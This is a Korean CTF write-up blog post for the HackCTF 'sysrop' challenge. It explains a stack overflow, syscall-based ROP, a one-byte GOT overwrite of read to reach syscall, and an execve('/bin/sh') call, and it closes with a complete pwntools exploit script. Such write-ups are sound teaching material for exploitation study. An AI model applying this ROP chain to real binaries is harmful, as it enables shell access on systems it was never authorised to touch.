---
layout: post
title:  "HacCTF sysrop write-up"
date:   2020-03-17 19:45:55
image:  hackctf_sysrop.PNG
tags:   [Hackctf]
categories: [Write-up]
---

# [HackCTF] sysrop

Date: Mar 17, 2020
Tags: report


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20sysrop/Untitled.png)

NX비트가 걸려있다. 이 문제 역시 GOT overwrite가 가능하다

**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20sysrop/Untitled%201.png)

바이너리를 실행시키면 한번의 입력을 받고 바로 종료가 된다

**3) 코드 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20sysrop/Untitled%202.png)

메인을 보면 read함수가 한번 실행되고 끝이 난다. rbp-0x10 위치에 입력한 값이 들어가고 최대 0x78크기의 데이터를 입력 가능하다. 이는 ret를 덮을 수 있는 충분한 크기이다.

### 2. 접근방법

---

일반적인 ROP를 진행하기 위해서는 libc의 주소를 leak하여 base주소를 구하고, libc의 offset을 이용하여 system함수를 실행시켜야 한다. 하지만 현재 출력할수 있는 함수가 없으므로 해당 방법은 불가능하다.

따라서 syscall을 이용하여 ROP를 진행해야 한다. 

    **** syscall 인란?**
    
    user단에서 커널단에게 파일을 읽거나 쓰는 특정 작업을 요청할 때 사용되는 어셈블리이다. 
    우리가 코드에서 일반적으로 사용하는 read 함수 같은 것도 시스템 콜을 바로 사용하는 것이 아닌,
    glibc에서 시스템 콜을 이용하여 표준 라이브러리로 wrapping 시킨 read함수를 사용하는 것이다
    따라서 libc read 함수 코드를 보면 내부에서 시스템 콜을 요청한다.
    
    시스템 콜이 실행되면 컨텍스트 체인지 일어나서 유저모드에서 커널모드로 변환되고 커널에서 작업 끝난 
    후 다시 유저모드로 돌아온다.
    이렇게 유저단에서 커널단으로 요청할때 사용되는 어셈블리가 **syscall, int 80** 이다. 
    (여기서 int는 자료형을 뜻하는게 아님)
    

"int 80" 이 현재 바이너리에 존재하지 않으므로 이를 이용할 수 는 없다. 따라서 read함수가 실행될때 내부적으로 실행되는 syscall을 이용하여 작업을 해야한다.

일반적으로 우리가 ROP를 진행할때 x64 기준으로는 필요한 인자값들을 순서에 맞게 레지스터에 넣어서 호출해줘야한다.

따라서 함수의 인자를 처리할 수 있는 "pop rdi " .. 등등 이러한 가젯이 필요하다. 

    ╭─wogh8732@wogh8732-VirtualBox ~/ctf/hackctf/sysrop 
    ╰─$ ROPgadget --binary sysrop
    ...
    **0x00000000004005ea : pop rax ; pop rdx ; pop rdi ; pop rsi ; ret
    ...**

현재 바이너리에 이러한 가젯이 존재하기 때문에 read 함수의 인자를 구성할수 있다.

하지만 우리가 현재 하려는 것은 일반적인 ROP가 아닌, read함수 내부에서 호출되는 syscall을 이용하는 ROP이다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20sysrop/Untitled%203.png)

위 그림은 read함수의 내부에서 호출되는 syscall 이다.  따라서 syscall의 동작원리에 맞게 인자를 세팅해서 ROP를 진행해야한다.

- **syscall 원리**

    시스템 콜은 다양한 종류가 있다. sys_read, sys_write.. 등등이 각 이름에 맞게 존재한다. 그럼 위 사진에서 syscall이 호출될때 어떠한 시스템 콜이 동작할까?

     간단하다. rax에 들어있는 값을 인자로 하여 해당 값에 정의되어 있는 시스템콜을 호출한다. rax가 0일 경우 해당 syscall은 sys_read를 호출하고, rax가 1일 경우 syscall은 sys_write가 호출한다. rax값에 따른 호출은 아래 사이트에서 확인 가능하다

    [Linux System Call Table for x86 64](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)

    Rax 레지스터로 호출되는 시스템콜의 종류가 결정되고, rdi, rsi, rdx, r8, r9, r10 레지스터에는 인자값이 들어가게 된다.

    우리가 사용할 시스템콜은 rax=59 시 호출되는 execve() 함수이다. 이를 이용하여 system("/bin/sh") 역할과 동일한 결과를 얻을수 있다.

- **시나리오**

    syscall을 이용하는 방법을 알았으니 이제 시작을 하면 된다. 우선 "/bin/sh" 문자열을 고정주소에 저장하고, 이를 인자로 하여 syscall(execve)를 호출하면 된다.

    1. **"/bin/bash" 삽입하기**
        - readelf -S sysrop 명령을 이용하여 적당한 위치를 찾는다. ⇒ 0x601940
        - (해당 문자열을 삽입하는 과정을 일반적인 ROP로 진행 가능하다)
        - pop rax; pop rdx; pop rdi; pop rsi; ret; ⇒ 0x4005EA

            현재 위 가젯을 사용가능하기 때문에 앞에 "pop rax" 다음부터 사용하면 read함수의 인자를 처리 가능 ⇒ pop rdx; pop rdi; pop rsi; ret; ⇒ 0x4005EB

        - payload

            ret(0x4005EB) + 0x8(rdx에 들어갈 size) + 0x601940(rdi에 들어가 bss 주소) + 0x0(rsi에 들어갈 fd) 

        - 위 페이로드를 보낸뒤, "/bin/sh" 를 보내면 bss영역에 해당 문자열이 저장됨

    2. **execve("/bin/sh"저장위치, NULL, NULL) 호출하기**
        - 이제부터 일반적인 ROP를 진행하면 read함수 내부의 syscall이 진행될때 rax에 0이 들어가 있으므로 execve를 호출하지 못함.
        - 따라서 rax값을 변경하기 위한 작업이 필요함. 다음의 과정을 통해 변경 가능
            1. 일반적인 ROP를 통해 read_got의 값을 syscall로 덮으면 됨. 그렇게 되면 main에서 read가 호출될때 정상적인 코드 흐름으로 syscall 부분으로 가는게 아닌 곧바로 syscall 부분으로 감
            2. 따라서 일반적인 ROP로 read_got를 syscall 위치로 바꿔야함. syscall이 진행되는 주소와 read_got에 들어있는 주소는 하위 한바이트만 다르므로 한바이트(0x5e)만 덮으면 됨
        - **payload**

                ret(0x4005EB) + 0x1(rdx에 들어갈 size) + read_got + 0x0(fd) + ...

        - 위 페이로드를 보낸뒤, "\x5e"를 보내면 read_got의 한바이트가 덮혀짐
        - 그다음 이제는 다시 메인으로 돌아갈 필요없이 RTL chain을 걸면 됨
        - 이제부터 execve를 호출하기 위한 인자를 "..." 이부분에 연결하면 끝
        - (rax, rdx, rdi, rsi 레지스터를 이용해야하기 때문에 원래의 가젯을 이용)

        - **readl payload**

                ret(0x4005EB) + 0x1+ read_got + 0x0 + 0x4005EA(pppr_gadget) + 
                
                59(rax에 들어갈 값) + NULL(rdx)+  0x601940(rdi에 들어가 bss 주소) + NULL(rsi)

### 3. 풀이

---

최종 익스코드는 다음과 같다

    from pwn import *
    context.log_level="DEBUG"
    p=remote("ctf.j0n9hyun.xyz",3024)
    #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
    #p=process("./sysrop",env=env,aslr=False)
    e=ELF("./sysrop")
    
    #gdb.attach(p)
    
    
    #need data
    bss_addr=p64(0x601040+0x900)
    ppr=p64(0x04005EB) # pop rdx; pop rdi; pop rsi; ret;
    pppr=p64(0x4005EA) # pop rax; pop rdx; pop rdi; pop rsi; ret;
    binbash="/bin/sh\x00"
    main_addr=p64(0x4005F2)
    read_got=p64(e.got['read'])
    read_plt=p64(e.plt['read'])
    
    
    #insert .bss /bin/sh 
    payload = "A"*0x18
    payload += ppr
    payload += p64(8)
    payload += p64(0)
    payload += bss_addr
    payload += read_plt
    payload += main_addr
    
    p.sendline(payload)
    pause()
    sleep(1)
    p.send(binbash)
    pause()
    sleep(1)
    
    payload2 = "A"*0x18
    payload2 += ppr
    payload2 += p64(1)
    payload2 += p64(0)
    payload2 += read_got
    payload2 += read_plt
    payload2 += pppr
    payload2 += p64(59)
    payload2 += p64(0x00)
    payload2 += bss_addr
    payload2 += p64(0x00)
    payload2 += read_plt
    
    p.sendline(payload2)
    pause()
    sleep(1)
    p.send("\x5e")
    pause()
    sleep(1)
    
    
    
    p.interactive()

### 4. 몰랐던 개념

---

- syscall을 이용한 SROP

[02.SROP(Sigreturn-oriented programming) - x64](https://www.lazenca.net/display/TEC/02.SROP%28Sigreturn-oriented+programming%29+-+x64)

위 사이트를 참고하여 SROP에 대해서 공부해야함. int 80 을 이용한 부분도 공부해야함

[SROP 정리](https://tribal1012.tistory.com/16)

요기 보고 해보자.